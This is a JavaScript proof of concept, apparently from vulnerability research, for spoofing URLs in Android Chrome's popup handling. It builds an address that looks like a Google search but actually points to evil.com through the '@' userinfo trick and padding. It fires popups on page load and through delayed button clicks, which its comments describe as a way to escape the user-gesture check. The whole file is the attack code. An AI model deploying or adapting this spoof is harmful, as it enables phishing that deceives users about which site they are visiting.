// Popup URL Spoof POC — Android Chrome

var LEGIT = 'https://www.google.com/search?q=what+is+claude';
var SPOOF = 'https://www.google.com/search?q=what+is+claude@evil.com' +
            '/' + 'x'.repeat(60) +
            '#search?q=what+is+claude';

// Auto-trigger on page load — guaranteed non-user-gesture → always blocked
window.addEventListener('load', function() {
  setTimeout(function() {
    window.open(LEGIT, '_blank');
    window.open(SPOOF, '_blank');
  }, 1500);
});

// Manual buttons with long delay to escape user gesture
document.getElementById('btnLegit').addEventListener('click', function() {
  setTimeout(function() {
    window.open(LEGIT, '_blank');
  }, 2000);
});

document.getElementById('btnSpoof').addEventListener('click', function() {
  setTimeout(function() {
    window.open(SPOOF, '_blank');
  }, 2000);
});
